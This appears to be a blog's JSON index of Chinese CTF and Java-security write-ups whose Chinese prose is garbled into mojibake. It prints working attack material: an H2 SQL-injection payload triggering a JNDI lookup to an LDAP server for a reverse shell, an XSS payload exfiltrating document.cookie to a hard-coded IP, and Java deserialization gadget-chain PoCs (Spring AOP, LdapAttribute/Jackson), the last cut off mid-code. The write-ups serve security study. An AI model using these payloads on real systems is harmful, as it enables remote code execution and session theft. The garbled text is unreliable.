(boolean)var8; } } ç„¶åæ•°æ®åº“ç±»å‹æ˜¯h2æ•°æ®åº“ï¼Œä¸”executeQuery()æ”¯æŒè§£æå¤šæ¡è¯­å¥ï¼Œé‚£å°±æ˜¯å¾ˆå¹³å¸¸çš„h2æ‰“æ³•äº†ï¼Œå› ä¸ºé¢˜ç›®å‡ºç½‘ï¼Œç»•é»‘åå•æˆ‘ç”¨çš„æ˜¯JNDIæ³¨å…¥ï¼Œä¸è¿‡ä¸å‡ºç½‘çš„è¯ä¹Ÿå¯ä»¥æ‰“å…¶ä»–çš„ï¼Œæ–¹æ³•å¾ˆå¤š\npayloadå¦‚ä¸‹\nadmin\u0026#39;;CREATE ALIAS abc AS \u0026#39;String rce(String cmd) throws Exception { new javax.naming.InitialContext().lookup(cmd); return \u0026#34;123\u0026#34;;}\u0026#39;;--\u0026amp;password=123 admin\u0026#39;;CALL abc (\u0026#39;ldap://ip:1389/Deserialize/Jackson/Command/åå¼¹shellå‘½ä»¤\u0026#39;);--\u0026amp;password=123 display è¿™é¢˜çŒªäº†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯DOMPurifyçš„0dayï¼Œçœ‹äº†ä¸€ä¸ªå¤šå°æ—¶æ²¡æˆç›´æ¥è·‘è·¯ç©æ¸¸æˆå»äº†\nç¬¬äºŒå¤©çœ‹åˆ°hintå‡ºäº†ä¹‹åå¾ˆå¿«å°±æœ‰äººè§£äº†æ‰è¿”å›æ¥çœ‹è¿™é“é¢˜,ç»“æœæ‰å‘ç°\nconst sanitizedText = sanitizeContent(atob(decodeURI(queryText))); console.log(sanitizedText) if (sanitizedText.length \u0026gt; 0) { textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº insertButton.disabled = false; } else { textInput.innerText = \u0026#34;Only allow h1, h2 tags and plain text\u0026#34;; } è¿™é‡ŒcontentDisplayçš„å€¼æ˜¯textInputçš„innerTextå•Š(å°±æ˜¯textInputåœ¨æµè§ˆå™¨ä¸Šå±•ç¤ºçš„å­—ç¬¦)\né‚£å°±å¯ä»¥å¾ˆç®€å•çš„åˆ©ç”¨htmlå®ä½“ç¼–ç æ¥ç»•è¿‡\nå¯ä»¥çœ‹åˆ°å¾ˆæˆåŠŸçš„æ’å…¥æˆ‘ä»¬çš„æ ‡ç­¾ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰è¢«DOMæ‰€æ¸²æŸ“ï¼Œè¿™é‡Œå°±ç”¨åˆ°hintäº†\næˆ‘ä»¬ä½¿ç”¨iframeæ¡†æ¶æ¥æ’å…¥script\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://111.229.198.6:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†ï¼Œä¹ŸæˆåŠŸè¢«cspæ‹¦äº†(\næ¥ä¸‹æ¥çš„ç»•cspå°±å…¶å®å¾ˆç®€å•äº†ï¼Œåœ¨å‰æ®µæ—¶é—´çš„sekaiCTFåšè¿‡ç›¸åŒçš„é¢˜\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\nå°±æ˜¯åˆ©ç”¨äº†404çš„é¡µé¢æ¥å†™å…¥æˆ‘ä»¬çš„jsä»£ç ï¼Œå†ç”¨srcè¿›è¡Œå¼•å…¥å°±è¡Œäº†\nè¿™é‡Œä¸è®²å¤ªå¤šï¼Œç›´æ¥è´´payload\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://ip:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ","date":"2025-02-11T23:00:00+08:00","permalink":"http://localhost:1313/post/2025n1junior-wp/","section":"post","tags":null,"title":"[2025]N1junior-WP"},{"categories":["Javaå®‰å…¨"],"contents":"å‰è¨€ åœ¨æµè§ˆæ–‡ç« çš„æ—¶å€™çœ‹è§æœ‰å¸ˆå‚…å‘ç°äº†ä¸€æ¡ä»…ä¾èµ–äºSpringbootä¸­çš„SpringAOPçš„é“¾ï¼Œäºæ˜¯è‡ªå·±è°ƒè¯•å­¦ä¹ äº†ä¸€ä¸‹\næ­£æ–‡ ä¾èµ–äºSpring-AOPå’Œaspectjweaverä¸¤ä¸ªåŒ…ï¼Œä½†æ˜¯springbootä¸­çš„spring-boot-starter-aopè‡ªå¸¦åŒ…å«è¿™ä¿©ç±»\næµç¨‹ è°ƒç”¨é“¾å¦‚ä¸‹\nJdkDynamicAopProxy.invoke()-\u0026gt;\rReflectiveMethodInvocation.proceed()-\u0026gt;\rAspectJAroundAdvice-\u0026gt;invoke-\u0026gt;\rorg.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-\u0026gt;\rmethod.invoke() æ‰§è¡Œç±»æ˜¯org.springframework.aop.aspectj.AbstractAspectJAdviceçš„invokeAdviceMethodWithGivenArgsæ–¹æ³•\nprotected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {\rObject[] actualArgs = args;\rif (this.aspectJAdviceMethod.getParameterCount() == 0) {\ractualArgs = null;\r}\rtry {\rReflectionUtils.makeAccessible(this.aspectJAdviceMethod);\rreturn this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);\r} catch (IllegalArgumentException ex) {\rthrow new AopInvocationException(\u0026#34;Mismatch on arguments to advice method [\u0026#34; + this.aspectJAdviceMethod + \u0026#34;]; pointcut expression [\u0026#34; + this.pointcut.getPointcutExpression() + \u0026#34;]\u0026#34;, ex);\r} catch (InvocationTargetException ex) {\rthrow ex.getTargetException();\r}\r} ç›´æ¥åœ¨AOPä¾èµ–ä¸‹çš„ä¸€ä¸ªsinkç‚¹ï¼Œæœ‰ç€åå°„æ‰§è¡Œä»»æ„æ–¹æ³•çš„èƒ½åŠ›ï¼Œæ“ä½œç©ºé—´å¾ˆå¤§\nåœ¨ä»–çš„å®ç°å­ç±»ï¼Œåœ¨ä»–çš„å­ç±»åŸºæœ¬ä¸Šinvoke(before)æ–¹æ³•çš„éƒ½è°ƒç”¨äº†ä»–çš„invokeAdviceMethodæ–¹æ³•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•èƒ½å¤Ÿè°ƒç”¨invoke(before)å³å¯\nç„¶åä¸‹ä¸€æ­¥æ‰¾åˆ°äº†ReflectiveMethodInvocationç±»,ä»–çš„proceedå°±èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬ä¸Šé¢çš„è¦æ±‚\næ¥ä¸‹æ¥åœ¨JdkDynamicAopProxyçš„invokeæ–¹æ³•å°†ä¼šè°ƒç”¨proceedæ–¹æ³•\nè¿™é‡Œæœ‰ä¸€ç‚¹å¾ˆæœ‰è¶£ï¼Œå°±æ˜¯ReflectiveMethodInvocationç±»æ˜¯æ²¡æœ‰å®ç°serializableæ¥å£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½å°†è¿™ä¸ªç±»æ”¾è¿›æˆ‘ä»¬çš„writeObjecté‡Œé¢ï¼Œä½†æ˜¯åœ¨JdkDynamicAopProxyç›´æ¥å¸®æˆ‘ä»¬newäº†ä¸€ä¸ªæ–°çš„å‡ºæ¥,ä¹Ÿæ˜¯å¾ˆå·§äº†\nç„¶åæµç¨‹å¤§è‡´å°±æ˜¯è¿™æ ·ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¯´ä¸€ä¸‹payloadæ‰§è¡Œä¸­çš„ä¸€äº›çŸ¥è¯†ç‚¹\næ„å»ºpayloadä¸­æ‰€éœ€æ³¨æ„çš„ è§¦å‘JdkDynamicAopProxyçš„invokeæ–¹æ³•æœ‰å¾ˆå¤šç§æ“ä½œæ–¹å¼äº†ï¼Œä»invokeçš„è§¦å‘æµç¨‹æ¥çœ‹ï¼Œä¸‹é¢è¿™ä¿©methodæ˜¯è‚¯å®šè§¦å‘ä¸äº†è¿™æ¡é“¾å­çš„ï¼Œä¼šæå‰returnå¯¼è‡´æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç æ²¡æ‰§è¡Œåˆ°\nhashcode()\requals() æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†å¹³å¸¸éå¸¸å¸¸è§çš„toStringå…¥å£ç±»\nä¸Šé¢æµç¨‹çš„å›¾ç‰‡ä¹Ÿçœ‹åˆ°äº†ï¼Œå¦‚æœè¦èµ°åˆ°proceedæ–¹æ³•é‚£é‡Œï¼Œé‚£é¦–å…ˆè¿˜å¾—è¿‡ä¸€ä¸‹chain.isEmpty()è¿™ä¸ªåˆ¤æ–­\nchainç”±ä»¥ä¸‹ä»£ç äº§ç”Ÿ\nList\u0026lt;Object\u0026gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); public List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rMethodCacheKey cacheKey = new MethodCacheKey(method);\rList\u0026lt;Object\u0026gt; cached = (List)this.methodCache.get(cacheKey);\rif (cached == null) {\rcached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);\rthis.methodCache.put(cacheKey, cached);\r}\rreturn cached;\r} å› ä¸ºmethodCacheç”±transientä¿®é¥°ï¼Œä¸èƒ½åœ¨ååºåˆ—åŒ–ä¸­è¢«æ¢å¤ï¼Œæ‰€ä»¥è¿™é‡Œçš„methodCacheä¸€å¼€å§‹ä¸€å®šä¸ºç©ºï¼Œé‚£æˆ‘ä»¬å°±è¦çœ‹åˆ°getInterceptorsAndDynamicInterceptionAdviceæ–¹æ³•äº†\nadvisorChainFactoryå¯¹åº”çš„æ¥å£å®ç°ç±»åªæœ‰DefaultAdvisorChainFactoryï¼Œè¿™é‡Œåªèƒ½çœ‹çœ‹å®ƒçš„\npublic List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rAdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();\rAdvisor[] advisors = config.getAdvisors();\rList\u0026lt;Object\u0026gt; interceptorList = new ArrayList(advisors.length);\rClass\u0026lt;?\u0026gt; actualClass = targetClass != null ? targetClass : method.getDeclaringClass();\rBoolean hasIntroductions = null;\rfor(Advisor advisor : advisors) {\rif (advisor instanceof PointcutAdvisor) {\rPointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;\rif (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {\rMethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();\rboolean match;\rif (mm instanceof IntroductionAwareMethodMatcher) {\rif (hasIntroductions == null) {\rhasIntroductions = hasMatchingIntroductions(advisors, actualClass);\r}\rmatch = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);\r} else {\rmatch = mm.matches(method, actualClass);\r}\rif (match) {\rMethodInterceptor[] interceptors = registry.getInterceptors(advisor);\rif (mm.isRuntime()) {\rfor(MethodInterceptor interceptor : interceptors) {\rinterceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));\r}\r} else {\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\r}\r} else if (advisor instanceof IntroductionAdvisor) {\rIntroductionAdvisor ia = (IntroductionAdvisor)advisor;\rif (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r} else {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\rreturn interceptorList;\r} æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä¸ç®¡æ˜¯é‚£ç§æ–¹å¼æ·»åŠ è¿›å…¥interceptorListçš„ï¼Œå…¶æ‰€å¯¹åº”çš„æˆå‘˜å¾€å¾€æ˜¯ä»registry.getInterceptors(advisor);æ¥çš„\né‚£è¿™é‡Œæˆ‘ä»¬é¡ºè—¤æ‘¸ç“œ,registryæ‰€å¯¹åº”çš„ç±»æ˜¯DefaultAdvisorAdapterRegistry\nå¯¹åº”çš„getInterceptorsä»£ç å¦‚ä¸‹\né‚£è¿™é‡Œæˆ‘ä»¬åªæœ‰ä»ç¬¬ä¸€ä¸ªåˆ¤æ–­å£è¿›å…¥æ‰èƒ½å¤Ÿæ·»åŠ interceptorsï¼Œä¸è¿‡è¦æ±‚æ˜¯æˆ‘ä»¬çš„advisorå¿…é¡»å®ç°äº†MethodInterceotoræ¥å£,ç®€å•çœ‹äº†ä¸€ä¸‹ç»§æ‰¿å…³ç³»ï¼Œå’Œæ–‡ç« å¸ˆå‚…é‡Œå¾—å‡ºçš„ç»“è®ºä¸€æ ·ï¼šæ²¡æœ‰åŒæ—¶å®ç°äº†è¯¥æ¥å£çš„advisorç±»\né¢å¯¹æ­¤ç§æƒ…å†µï¼Œæˆ‘ä»¬ä½¿ç”¨äº†åŠ¨æ€ä»£ç†å»å°†MethodInterceotorç»™advisorç±»ä»£ç†ä¸Šï¼Œä½¿å…¶å®ç°åŒæ¥å£\nè¿™é‡Œåˆç”¨åˆ°äº†ä¸€æ¬¡JdkDynamicAopProxy,ä¸è¿‡å’Œå‰é¢çš„ä½œç”¨å®Œå…¨ä¸åŒ\nç„¶åè¿™é‡Œå°±èƒ½å¤Ÿé¡ºåˆ©returnå›æˆ‘ä»¬æƒ³è¦çš„interceptors,chainä¹Ÿèƒ½æ‰§è¡Œåˆ°æˆ‘ä»¬çš„proceedæ–¹æ³•äº†\næœ€åå°±æ˜¯åœ¨æˆ‘ä»¬çš„org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgsä¸­\nthis.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs); è¿™é‡Œè¿˜è¦ä»aspectInstanceFactoryä¸­è·å–åˆ°ä¸€ä¸ªæ–¹æ³•ç±»çš„å®ä¾‹,æ–‡ç« ä¸­æ˜¯ä½¿ç”¨äº†SingletonAspectInstanceFactoryè¿™ä¸ªç±»\nå’ŒCCé‡Œçš„ConstantTransformerå¾ˆç›¸ä¼¼\nPOC import Utils.Util;\rimport com.fasterxml.jackson.databind.node.POJONode;\rimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\rimport javassist.ClassPool;\rimport javassist.CtClass;\rimport javassist.CtConstructor;\rimport org.aopalliance.aop.Advice;\rimport org.aopalliance.intercept.MethodInterceptor;\rimport org.springframework.aop.aspectj.AbstractAspectJAdvice;\rimport org.springframework.aop.aspectj.AspectJAroundAdvice;\rimport org.springframework.aop.aspectj.AspectJExpressionPointcut;\rimport org.springframework.aop.aspectj.SingletonAspectInstanceFactory;\rimport org.springframework.aop.framework.AdvisedSupport;\rimport org.springframework.aop.support.DefaultIntroductionAdvisor;\rimport org.springframework.core.Ordered;\rimport java.lang.reflect.*;\rimport java.util.PriorityQueue;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport javax.management.BadAttributeValueExpException;\rimport javax.xml.transform.Templates;\rpublic class main {\rpublic static void main(String[] args) throws Exception {\rClassPool pool = ClassPool.getDefault();\rCtClass clazz = pool.makeClass(\u0026#34;a\u0026#34;);\rCtClass superClass = pool.get(AbstractTranslet.class.getName());\rclazz.setSuperclass(superClass);\rCtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);\rconstructor.setBody(\u0026#34;Runtime.getRuntime().exec(\\\u0026#34;open -na Calculator\\\u0026#34;);\u0026#34;);\rclazz.addConstructor(constructor);\rbyte[][] bytes = new byte[][]{clazz.toBytecode()};\rTemplatesImpl templates = TemplatesImpl.class.newInstance();\rUtil.setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, bytes);\rUtil.setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;GSBP\u0026#34;);\rUtil.setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, null);\rMethod method=templates.getClass().getMethod(\u0026#34;newTransformer\u0026#34;);//è·å–newTransformeræ–¹æ³•\rSingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);\rAspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);\rProxy proxy1 = (Proxy) getAProxy(advice,Advice.class);\rBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);\rUtil.setFieldValue(badAttributeValueExpException, \u0026#34;val\u0026#34;, proxy1);\rUtil.deserialize(Util.serialize(badAttributeValueExpException));\r}\rpublic static Object getBProxy(Object obj,Class[] clazzs) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);\rreturn proxy;\r}\rpublic static Object getAProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rAbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;\rDefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));\radvisedSupport.addAdvisor(advisor);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);\rreturn proxy;\r}\r} å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\n","date":"2025-01-23T23:33:31+08:00","permalink":"http://localhost:1313/post/springaop/","section":"post","tags":null,"title":"SpringAOPé“¾å­¦ä¹ "},{"categories":["Javaå®‰å…¨","WP"],"contents":"èµ·å›  æœ¬æœˆäº”å·çš„æ—¶å€™æ‰“äº†ä¸ªè½¯ä»¶æ”»é˜²èµ›ï¼Œé‡Œé¢æœ‰é“javaå½“æ—¶æ²¡åšå‡ºæ¥ï¼Œç”¨çš„ldapAttribute+Jacksonæ­»æ´»æ²¡é€šï¼Œåé¢è‡ªå·±è°ƒè¯•äº†ä¸€ä¸‹ï¼Œè¿™é‡Œåšä¸ªè®°å½•\né¢˜ç›®åˆ†æ é¢˜ç›®åå«JDBCParty,jdkç‰ˆæœ¬æ˜¯17ï¼Œé‡Œé¢ç»™äº†ä¸ªæ¥å£æºç å¦‚ä¸‹\n@PostMapping({\u0026#34;/dbtest\u0026#34;}) public ResponseEntity\u0026lt;String\u0026gt; dbtest(String data) { try { User credentials = (User)Utils.deserialize(data); Class.forName(this.driverClassName); try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) { if (connection.isValid(5)) { return ResponseEntity.ok(\u0026#34;connect success\u0026#34;); } else { return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed\u0026#34;); } } } catch (Exception e) { e.printStackTrace(); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed \u0026#34; + e.getMessage()); } } } è¡¨é¢ä¸Šæ˜¯ç»™äº†ä¸ªJDBCçš„å…¥å£ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½æ§çš„åªæœ‰usernameå’Œpasswordï¼Œæ‰“ä¸äº†jdbcã€‚\nå®é™…å…¥å£æ˜¯é‚£ä¸ªååºåˆ—åŒ–ï¼Œä»è¿™ä¸ªååºåˆ—åŒ–é‡Œé¢åšæ–‡ç« \nç„¶åçœ‹çœ‹é¢˜ç›®ç»™çš„ä¾èµ–\n- \u0026#34;BOOT-INF/lib/spring-boot-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-2.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-swing-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-anim-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-parser-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-svg-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-awt-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-io-1.3.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-logging-1.0.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-bridge-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-xml-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-css-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xalan-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/serializer-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-1.4.01.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-ext-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gui-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gvt-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-script-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-shared-resources-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-constants-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-i18n-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar\u0026#34; - \u0026#34;BOOT-INF/lib/fastjson2-2.0.37.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar\u0026#34; æœ‰tomcat-jdbc,snakeYaml,EL,Jacksonå’Œfastjson2ç­‰ç­‰ï¼Œé¢˜ç›®æŒ‡å‘æ€§å¾ˆå¼ºï¼Œå°±æ˜¯è®©æˆ‘ä»¬ç”¨ä¸€ä¸ªJNDIé€šè¿‡Tomcat-JDBCæ‰“ELï¼ŒsnakeYamlè¡¨è¾¾å¼æ³¨å…¥çš„æ“ä½œ\nè§£ æ‰€ä»¥è¿™é‡Œéœ€è¦æˆ‘ä»¬é€šè¿‡ååºåˆ—åŒ–åˆ›é€ ä¸€ä¸ªjndiæ³¨å…¥\nè¿™é‡Œå°±æƒ³åˆ°äº†24å¹´çš„N1junioré‡Œçš„Derby Plusï¼Œé‡Œé¢æ˜¯é€šè¿‡CB+LdapAttributeæ¥å®ç°äº†ä¸€ä¸ªJNDIæ³¨å…¥\nè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰CBï¼Œä½†æ˜¯æœ‰Fastjson2å’Œjacksonå¯ä»¥è§¦å‘getterï¼Œåœ¨æ¯”èµ›çš„æ—¶å€™æˆ‘å†™çš„pocå¦‚ä¸‹\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; //import static org.example.Main.deserial; //import static org.example.Main.serial; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //è·å–åŸºç±»æ¨¡å— Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //è·å–callerç±»çš„module fieldçš„åœ°å€ long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //ç›´æ¥å°†åŸºç±»moduleçš„å€¼è¦†ç›–åœ¨æˆ‘ä»¬çš„åœ°å€ä¸Š unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void 